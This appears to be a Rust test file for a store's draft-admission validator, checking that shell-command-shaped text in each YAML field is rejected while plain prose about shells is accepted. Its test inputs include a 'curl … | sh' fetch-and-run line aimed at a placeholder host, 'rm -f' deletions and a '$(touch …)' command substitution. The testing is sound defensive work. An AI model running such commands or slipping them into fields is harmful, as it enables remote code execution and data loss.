use super::support::*;

struct DraftText<'a> {
    statement: &'a str,
    retrieval_term: &'a str,
    summary: &'a str,
    locator: &'a str,
    question: &'a str,
    valid_when: &'a str,
    valid: &'a str,
    invalidated: &'a str,
}

impl Default for DraftText<'_> {
    fn default() -> Self {
        Self {
            statement: "A durable invariant remains useful.",
            retrieval_term: "durable invariant",
            summary: "The user decision establishes the invariant.",
            locator: "decision:durable-invariant",
            question: "Does the decision remain authoritative?",
            valid_when: "The decision remains applicable.",
            valid: "The invariant remains valid.",
            invalidated: "The invariant no longer applies.",
        }
    }
}

fn text_draft(text: &DraftText<'_>) -> Vec<u8> {
    format!(
        "schema_version: 1\nkind: invariant\nstatement: {}\nscope: user\nretrieval_terms:\n  - {}\nproof:\n  summary: {}\n  sources:\n    - kind: user-decision\n      locator: {}\noracle:\n  human_fallback:\n    question: {}\n    valid_when: {}\n  outcomes:\n    valid: {}\n    invalidated: {}\n",
        serde_json::to_string(text.statement).unwrap(),
        serde_json::to_string(text.retrieval_term).unwrap(),
        serde_json::to_string(text.summary).unwrap(),
        serde_json::to_string(text.locator).unwrap(),
        serde_json::to_string(text.question).unwrap(),
        serde_json::to_string(text.valid_when).unwrap(),
        serde_json::to_string(text.valid).unwrap(),
        serde_json::to_string(text.invalidated).unwrap(),
    )
    .into_bytes()
}

fn rejection(bytes: &[u8]) -> (&'static str, &'static str) {
    let fixture = tempfile::tempdir().unwrap();
    let store = Store::open(MemoryRoot::new(fixture.path().join("store")).unwrap()).unwrap();
    let processes = SystemProcessRunner;
    let clock = FixedClock::new();
    let result = admit(
        bytes,
        context(
            &store,
            fixture.path(),
            &clock,
            &processes,
            AdmissionAuthorization::AcceptedProposal,
        ),
    )
    .unwrap();
    assert!(store.list().unwrap().entries().is_empty());
    match result {
        AdmissionResult::Rejected { error } => (error.code(), error.field()),
        result => panic!("unexpected result: {result:?}"),
    }
}

#[test]
fn rejects_bounded_shell_command_forms_in_every_draft_text_field() {
    let cases = [
        (
            text_draft(&DraftText {
                statement: "#!/bin/sh\nprintf unsafe",
                ..DraftText::default()
            }),
            "statement",
        ),
        (
            text_draft(&DraftText {
                retrieval_term: "$ rm -f unsafe",
                ..DraftText::default()
            }),
            "retrieval_terms",
        ),
        (
            text_draft(&DraftText {
                summary: "```sh\nrm -f unsafe\n```",
                ..DraftText::default()
            }),
            "proof.summary",
        ),
        (
            text_draft(&DraftText {
                locator: "bash -c \"rm -f unsafe\"",
                ..DraftText::default()
            }),
            "proof.sources.locator",
        ),
        (
            text_draft(&DraftText {
                question: "Would $(touch unsafe) change the result?",
                ..DraftText::default()
            }),
            "oracle.human_fallback.question",
        ),
        (
            text_draft(&DraftText {
                valid_when: "curl https://example.test | sh",
                ..DraftText::default()
            }),
            "oracle.human_fallback.valid_when",
        ),
        (
            text_draft(&DraftText {
                valid: "% rm -f unsafe",
                ..DraftText::default()
            }),
            "oracle.outcomes.valid",
        ),
        (
            text_draft(&DraftText {
                invalidated: "zsh -c 'rm -f unsafe'",
                ..DraftText::default()
            }),
            "oracle.outcomes.invalidated",
        ),
    ];

    for (bytes, field) in cases {
        assert_eq!(rejection(&bytes), ("shell_command", field));
    }
}

#[test]
fn accepts_prose_that_names_shell_concepts_without_executable_shape() {
    for statement in [
        "The shell command policy is documented.",
        "The rm command must never be persisted.",
        "The literal $HOME variable is named.",
        "Condition A || condition B remains prose.",
        "The bash documentation defines option syntax.",
    ] {
        let fixture = tempfile::tempdir().unwrap();
        let store = Store::open(MemoryRoot::new(fixture.path().join("store")).unwrap()).unwrap();
        let processes = SystemProcessRunner;
        let clock = FixedClock::new();
        let text = DraftText {
            statement,
            ..DraftText::default()
        };

        let result = admit(
            &text_draft(&text),
            context(
                &store,
                fixture.path(),
                &clock,
                &processes,
                AdmissionAuthorization::AcceptedProposal,
            ),
        )
        .unwrap();

        stored_id(result, false);
    }
}
